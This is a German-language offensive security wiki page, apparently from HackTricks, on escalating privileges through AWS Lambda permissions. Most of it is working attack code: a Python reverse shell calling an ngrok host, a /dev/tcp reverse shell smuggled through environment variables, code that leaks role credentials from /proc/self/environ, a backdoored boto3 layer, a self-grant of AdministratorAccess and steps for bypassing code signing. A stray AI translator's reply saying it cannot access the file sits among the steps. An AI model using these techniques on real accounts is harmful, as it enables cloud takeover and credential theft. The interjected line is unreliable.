# AWS - Lambda Privesc

{{#include ../../../banners/hacktricks-training.md}}

## lambda

Mehr Informationen zu lambda in:

{{#ref}}
../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Benutzer mit den **`iam:PassRole`, `lambda:CreateFunction` und `lambda:InvokeFunction`**-Berechtigungen können ihre Privilegien eskalieren.\
Sie können **eine neue Lambda-Funktion erstellen und ihr eine vorhandene IAM-Rolle zuweisen**, wodurch die Funktion die mit dieser Rolle verknüpften Berechtigungen erhält. Der Benutzer kann dann **Code in diese Lambda-Funktion schreiben und hochladen (z. B. mit einer rev shell)**.\
Sobald die Funktion eingerichtet ist, kann der Benutzer **deren Ausführung auslösen** und die beabsichtigten Aktionen durchführen, indem er die Lambda-Funktion über die AWS API aufruft. Auf diese Weise kann der Benutzer effektiv Aufgaben indirekt über die Lambda-Funktion ausführen und dabei mit dem Zugriffsniveau arbeiten, das der zugewiesenen IAM-Rolle gewährt ist.\\

Ein Angreifer könnte dies missbrauchen, um eine **rev shell zu bekommen und das token zu stehlen**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Du könntest auch **abuse the lambda role permissions** direkt aus der lambda function selbst ausnutzen.\
Wenn die lambda role über genügend Berechtigungen verfügt, könntest du sie verwenden, um dir Adminrechte zu gewähren:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Es ist auch möglich, ein leak der role credentials der lambda zu erzeugen, ohne eine externe Verbindung zu benötigen. Das wäre nützlich für **Network isolated Lambdas**, die für interne Aufgaben verwendet werden. Wenn unbekannte security groups deine reverse shells filtern, ermöglicht dir dieses Code-Stück, ein leak der credentials direkt als Ausgabe der lambda zu erzeugen.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potentielle Auswirkung:** Direkter privesc auf die angegebene beliebige Lambda-Service-Rolle.

> [!CAUTION]
> Beachte, dass selbst wenn es verlockend erscheinen mag, **`lambda:InvokeAsync`** allein nicht erlaubt, **`aws lambda invoke-async`** auszuführen — du benötigst außerdem **`lambda:InvokeFunction`**

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Wie im vorherigen Szenario kannst du dir **die Berechtigung `lambda:InvokeFunction`** selbst gewähren, wenn du die Berechtigung **`lambda:AddPermission`** besitzt.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potential Impact:** Direkter privesc auf die angegebene beliebige lambda service role.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Benutzer mit **`iam:PassRole`, `lambda:CreateFunction` und `lambda:CreateEventSourceMapping`** Berechtigungen (und möglicherweise `dynamodb:PutItem` und `dynamodb:CreateTable`) können indirekt **escalate privileges** selbst ohne `lambda:InvokeFunction`.\  
Sie können eine **Lambda-Funktion mit bösartigem Code erstellen und ihr eine vorhandene IAM-Rolle zuweisen**.

Anstatt die Lambda direkt aufzurufen, richtet der Benutzer eine vorhandene DynamoDB-Tabelle ein oder verwendet sie und verknüpft sie über ein event source mapping mit der Lambda. Diese Konfiguration sorgt dafür, dass die Lambda-Funktion **automatisch bei einem neuen Eintrag** in der Tabelle ausgelöst wird — entweder durch die Aktion des Benutzers oder einen anderen Prozess — und dadurch die Lambda-Funktion indirekt aufgerufen wird und der Code mit den Rechten der übergebenen IAM-Rolle ausgeführt wird.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Wenn DynamoDB bereits in der AWS-Umgebung aktiv ist, muss der Benutzer nur **das Event-Source-Mapping für die Lambda-Funktion einrichten**. Wenn DynamoDB jedoch nicht verwendet wird, muss der Benutzer **eine neue Tabelle erstellen** und dabei Streaming aktivieren:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Jetzt ist es möglich, **die Lambda-Funktion mit der DynamoDB-Tabelle zu verbinden**, indem man **ein event source mapping erstellt**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Mit der an den DynamoDB-Stream gebundenen Lambda-Funktion kann der Angreifer **die Lambda-Funktion indirekt auslösen, indem er den DynamoDB-Stream aktiviert**. Dies kann erreicht werden, indem **ein Item** in die DynamoDB-Tabelle eingefügt wird:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potential Impact:** Direkter privesc auf die angegebene lambda-Service-Rolle.

### `lambda:AddPermission`

Ein Angreifer mit dieser Berechtigung kann sich **(oder anderen) beliebige Berechtigungen gewähren** (dies erzeugt ressourcenbasierte Policies, um Zugriff auf die Ressource zu gewähren):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Mögliche Auswirkung:** Direkte privesc auf die für lambda verwendete Service-Rolle, indem die Berechtigung zum Ändern des Codes und zum Ausführen gewährt wird.

### `lambda:AddLayerVersionPermission`

Ein Angreifer mit dieser Berechtigung kann **sich selbst (oder anderen) die Berechtigung `lambda:GetLayerVersion` gewähren**. Er könnte auf das Layer zugreifen und nach Schwachstellen oder sensiblen Informationen suchen.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potenzielle Auswirkung:** Möglicher Zugriff auf sensible Informationen.

### `lambda:UpdateFunctionCode`

Benutzer mit der Berechtigung **`lambda:UpdateFunctionCode`** haben die Möglichkeit, **den Code einer bestehenden Lambda-Funktion zu ändern, die mit einer IAM-Rolle verknüpft ist.**\
Der Angreifer kann **den Code der Lambda-Funktion so ändern, dass IAM-Zugangsdaten exfiltriert werden**.

Obwohl der Angreifer möglicherweise nicht die direkte Möglichkeit hat, die Funktion aufzurufen, ist es wahrscheinlich, dass eine vorbestehende und betriebsbereite Lambda-Funktion durch vorhandene Workflows oder Events ausgelöst wird, wodurch die Ausführung des modifizierten Codes indirekt ermöglicht wird.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potential Impact:** Direkter privesc auf die verwendete Lambda-Service-Rolle.

### `lambda:UpdateFunctionConfiguration`

#### RCE über Umgebungsvariablen

Mit dieser Berechtigung ist es möglich, Umgebungsvariablen hinzuzufügen, die dazu führen, dass die Lambda-Funktion beliebigen Code ausführt. Zum Beispiel ist es in python möglich, die Umgebungsvariablen `PYTHONWARNING` und `BROWSER` auszunutzen, um einen python-Prozess beliebige Befehle ausführen zu lassen:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Für andere Skriptsprachen gibt es weitere env variables, die du verwenden kannst. Für mehr Informationen siehe die Unterabschnitte zu Skriptsprachen in:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE via Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) ermöglicht, **code** in deiner lamdba function zu integrieren, diesen aber **separat zu speichern**, sodass der Funktionscode klein bleibt und **mehrere Funktionen Code teilen können**.

Innerhalb von lambda kannst du die Pfade prüfen, von denen python code geladen wird, mit einer Funktion wie der folgenden:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Dies sind die Pfade:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Exploitation

It's possible to abuse the permission `lambda:UpdateFunctionConfiguration` to **eine neue Layer hinzuzufügen** to a lambda function. To execute arbitrary code this layer need to contain some **library that the lambda is going to import.** If you can read the code of the lambda, you could find this easily, also note that it might be possible that the lambda is **already using a layer** and you could **download** the layer and **add your code** in there.

For example, lets suppose that the lambda is using the library boto3, this will create a local layer with the last version of the library:
```bash
pip3 install -t ./lambda_layer boto3
```
Du kannst `./lambda_layer/boto3/__init__.py` öffnen und **add the backdoor in the global code** (zum Beispiel eine Funktion, um credentials zu exfiltrate oder eine reverse shell zu bekommen).

Zippe dann das Verzeichnis `./lambda_layer` und **upload the new lambda layer** in deinem eigenen Konto (oder in dem des Opfers, aber du hast dafür möglicherweise nicht die Berechtigungen).\
Beachte, dass du einen python-Ordner erstellen und die Bibliotheken dort ablegen musst, um /opt/python/boto3 zu überschreiben. Außerdem muss die layer **compatible with the python version** sein, die von der lambda verwendet wird, und wenn du sie in deinem Konto hochlädst, muss sie in der **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Mache jetzt die hochgeladene lambda layer **für jedes Konto zugänglich**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Und hänge das lambda layer an die Ziel-lambda-Funktion an:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Der nächste Schritt wäre entweder, die Funktion selbst **aufzurufen**, falls möglich, oder zu warten, bis e**s aufgerufen wird** durch normale Mittel — was die sicherere Methode ist.

Eine **heimlichere Methode, diese Schwachstelle auszunutzen**, findet sich in:

{{#ref}}
../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Mögliche Auswirkungen:** Direkter privesc zur verwendeten lambda service role.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Vielleicht kannst du mit diesen Berechtigungen eine Funktion erstellen und sie via URL ausführen... aber ich konnte keinen Weg finden, das zu testen, also sag mir Bescheid, wenn du es schaffst!

### Lambda MitM

Einige lambdas werden **sensible Informationen von Benutzern in Parametern empfangen.** Wenn du in einem von ihnen RCE erzielst, kannst du die Informationen exfiltrieren, die andere Benutzer an ihn senden; siehe:

{{#ref}}
../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Wenn eine Lambda-Funktion Code Signing erzwingt, kann ein Angreifer, der entweder die Code Signing Config (CSC) entfernt oder sie auf `WARN` herabstuft, nicht signierten Code in die Funktion deployen. Das umgeht Integritätsschutzmaßnahmen, ohne die IAM-Rolle der Funktion oder deren Triggers zu verändern.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- Für Path B brauchst du kein AWS Signer-Profil, wenn die CSC-Policy auf `WARN` gesetzt ist (nicht signierte Artefakte erlaubt).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Prepare a small payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Pfad A) Entferne CSC und aktualisiere dann den Code:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Pfad B) Auf 'Warn' herabstufen und Code aktualisieren (falls Löschen nicht erlaubt):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Ich habe keinen Zugriff auf die Datei. Bitte füge den Markdown-Inhalt von src/pentesting-cloud/aws-security/aws-privilege-escalation/aws-lambda-privesc.md hier ein oder präzisiere, was genau ich überprüfen/übersetzen soll.
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Mögliche Auswirkung: Fähigkeit, beliebigen unsigned code in eine function zu pushen und auszuführen, die eigentlich signed deployments durchsetzen sollte — dies kann zur code execution mit den Berechtigungen der function role führen.

Bereinigung:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

